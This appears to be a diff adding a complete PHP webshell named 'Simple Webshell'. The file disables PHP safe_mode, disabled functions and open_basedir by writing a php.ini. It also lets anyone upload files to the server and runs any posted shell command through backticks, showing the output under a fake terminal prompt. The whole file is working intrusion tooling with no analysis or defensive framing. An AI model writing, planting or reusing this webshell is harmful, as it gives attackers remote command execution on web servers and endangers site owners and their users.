@@ -1,0 +1,25 @@
+<?php
+error_reporting(0);
+ini_set('display_errors', 0);
+fwrite(fopen("php.ini","w"),"safe_mode = Off
+disable_functions = NONE
+safe_mode_gid = OFF
+open_basedir = OFF ");?>
+<head>
+<meta content='CREATED BY AZZATSSINS CYBERSERKERS' name='description'>
+<title>Simple Webshell</title></head><style>
+body{
+font-family: "courier new";
+background-color: black;
+font-size:80%;
+color: #28FE14;
+background-image: url("http://i.imgur.com/zHNCk2e.gif");
+}
+input{
+margin:0;background-color:black;color:#28FE14;
+border:1px solid black; } 
+</style>
+<?php if(isset($_FILES['upload']['name'])){ $name = $_FILES['upload']['name']; $azx = $_FILES['upload']['tmp_name']; @move_uploaded_file($azx, $name); echo"<center><a href='{$name}'>SUCCESS</a>";}
+
+?><pre><?php echo `$_POST[I]`;
+?></pre><br><form method=post>[<?=get_current_user();?>@<?=$_SERVER['HTTP_HOST'];?>]~ $ <input name="I"></form>
